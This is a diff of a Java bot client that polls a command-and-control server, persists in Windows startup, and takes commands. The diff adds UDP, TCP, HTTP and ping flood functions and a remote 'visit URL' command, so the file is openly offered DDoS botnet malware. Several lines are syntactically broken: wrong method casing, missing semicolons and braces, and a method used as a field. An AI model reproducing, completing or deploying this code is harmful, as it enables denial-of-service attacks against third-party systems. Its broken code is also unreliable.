@@ -1,5 +1,27 @@
 package com.am77;
 
+import java.io.BufferedInputStream;
+import java.io.BufferedOutputStream;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.net.DatagramPacket;
+import java.net.DatagramSocket;
+import java.net.HttpURLConnection;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.net.SocketException;
+import java.net.URL;
+
 
 import com.am77.extern.HttpRequest;
 import com.am77.extern.RegistryUtils;
@@ -9,7 +31,9 @@ import java.net.ConnectException;
 public class Client {
 
     public static String filename = "jupdate.jar";
-    public static boolean debug = true;
+    public static boolean debug = true;  // Change this to false on release
+    public int packSize = 65000;
+
 
     public static void main(String[] args) throws InterruptedException{
 
@@ -19,21 +43,21 @@ public class Client {
         while (true) {
 
             try {
-                HttpRequest request = HttpRequest.get("http://192.168.153.34:8080");
+                HttpRequest request = HttpRequest.get("http://1.1.1.1:8080");  // Change this to the IP:port of your listen server
                 body = request.body();
-                System.out.println(body);
+                debug(body);
 
                 if (os.startsWith("Windows")) {
                     addToStartup();
                 }
                 body = body.replace("\n", "");
 
-            /*
-            Parse the response here
-             */
+              /*
+               Parse the response here
+              */
 
                 if (body.equals("NONE")) {
-                    debug("Got a none");
+                    debug("Got a none, waiting 3 seconds.");
                     Thread.sleep(3000);
                 } else if (body.startsWith("udp")) {
                     debug("UDP ATTACK");
@@ -41,7 +65,10 @@ public class Client {
                     debug("TCP ATTACK");
                 } else if (body.startsWith("http")) {
                     debug("HTTP ATTACK");
-                } else {
+                } else if (body.startswith("visit"){
+                    String[] split = body.split(" ");
+                    debug("VISIT " + split[1])
+                }else {
                     debug("Got an unknown command: " + body);
                 }
 
@@ -50,6 +77,121 @@ public class Client {
                 Thread.sleep(10000);
             }
         }
+    }
+
+
+/*
+     ______ _                 _
+    |  ____| |               | |
+   | |__  | | ___   ___   __| |___
+  |  __| | |/ _ \ / _ \ / _` / __|
+ | |    | | (_) | (_) | (_| \__ \
+|_|    |_|\___/ \___/ \__,_|___/
+*/
+    public static void udpFlood(String host, final long duration){
+      final String target = resolve(host);
+       new Thread(new Runnable() {
+
+           public void run() {
+               try {
+                   long endTime = System.currentTimeMillis() + duration;
+                   DatagramSocket udpSocket = new DatagramSocket();
+                   while (System.currentTimeMillis() < endTime) {
+                       byte[] data = new byte[65000];
+                       data = fillPack.getBytes();
+                       try {
+                           udpSocket.send(new DatagramPacket(data, data.length, InetAddress.getByName(target), (int) (Math.random() * 65534) + 1));
+                       } catch (IOException ioe) {
+                       }
+                   }
+                   udpSocket.close();
+               } catch (SocketException se) {
+               }
+           }
+       }).start();
+    }
+
+    public static void tcpFlood(String host, final int port, int thread, final long duration) throws Exception {
+        final String target = resolve(host);
+        for (int i = 0; i < thread; i++) {
+            new Thread(new Runnable() {
+
+                public void run() {
+                    try {
+                        long endTime = System.currentTimeMillis() + duration;
+                        while (System.currentTimeMillis() < endTime) {
+                            new Socket(target, port);
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+        }
+    }
+
+    public static void httpFlood(String host, final long duration) throws Exception {
+        final String target = resolve(host);
+        new Thread(new Runnable() {
+            public void run() {
+                long endTime = System.currentTimeMillis() + duration;
+                while (System.currentTimeMillis() < endTime) {
+                    try {
+                        HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
+                        conn.setRequestMethod("GET");
+                    } catch (IOException ex) {
+                        ex.printStackTrace();
+                    }
+                }
+            }
+        }).start();
+    }
+
+    public static void pingOD(String host, final long duration, int thread){
+      final String target = resolve(host);
+      for (int i = 0; i < thread; i++) {
+          new Thread(new Runnable() {
+
+              public void run() {
+                  try {
+                      long endTime = System.currentTimeMillis() + duration;
+                      InetAddress addr = InetAddress.getByName(host);
+                      while (System.currentTimeMillis() < endTime) {
+                          addr.isReachable(5)  // Sends a ping to the target (5 sec timeout)
+                      }
+                  } catch (Exception e) {
+                      e.printStackTrace();
+                  }
+              }
+          }).start();
+    }
+
+/*
+     ____  __  __
+   / __ \/ /_/ /_  ___  _____
+  / / / / __/ __ \/ _ \/ ___/
+ / /_/ / /_/ / / /  __/ /
+\____/\__/_/ /_/\___/_/
+
+*/
+    private void visit(final URL url) throws Exception {
+        new Thread(new Runnable() {
+            public void run() {
+                try {
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("GET");
+                    conn.setDoOutput(true);
+                    conn.setReadTimeout(500);
+                    conn.connect();
+                    conn.getInputStream();
+                    conn = null;
+                } catch (MalformedURLException murle) {
+                    murle.printStackTrace();
+                } catch (IOException ioe) {
+                    ioe.printStackTrace();
+                }
+            }
+        }).start();
     }
 
     private static void addToStartup(){
@@ -61,8 +203,27 @@ public class Client {
     }
 
     public static void debug(String msg){
-        if (debug){
+        if (debug)
             System.out.println(msg);
-        }
+
     }
+
+    private static String resolve(String host) throws Exception {
+        URL url = null;
+        if (host.contains("http://")) {
+            url = new URL(host);
+        } else {
+            url = new URL("http://" + host);
+        }
+        return InetAddress.getByName(url.getHost()).getHostAddress();
+    }
+  }
+
+  public static String fillPack(){
+    String result = "";
+    for (int i=0; i < packSize; i++){
+      result += "A";
+    }
+    return result;
+  }
 }
